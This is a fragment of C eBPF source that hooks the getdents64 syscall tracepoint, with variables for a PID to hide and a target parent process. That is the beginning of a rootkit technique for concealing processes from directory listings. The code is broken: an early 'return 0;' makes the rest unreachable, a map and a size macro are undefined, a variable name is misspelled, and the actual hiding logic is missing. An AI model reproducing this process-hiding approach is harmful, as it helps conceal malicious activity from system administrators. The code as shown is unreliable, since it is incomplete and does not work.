#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

const volatile int target_ppid =0;
const volatile int pid_to_hide_len=0;
const volatile char pid_to_hide[MAX_PID_LEN];


SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
	return 0;
	size_t pid_tgid = bpf_get_current_pid_tgid();
	if(target_ppid !=0){
		struct task_struct *task = (struct task_struct *) bpf_get_current_task();
		int ppid = BPF_CORE_READ(task, real_parent,tgid);
		if (ppid != target_ppid){
			return 0;
			}
		}
	int pid = pid_tgid >> 32;
	unsigned int fd = ctx -> args[0];
	unsigned int buff_count = ctx -> args[2];
	struct linux_dirent64 *dirp = (struct linux_dirent64 *) ctx->args[1];
	bpf_map_update_elem(&map_buffs,&pid_tgid,&drip,BPF_ANY);
	return 0;
}

char LICENSE[] SEC("license") = "DUAL BSD/GPL";

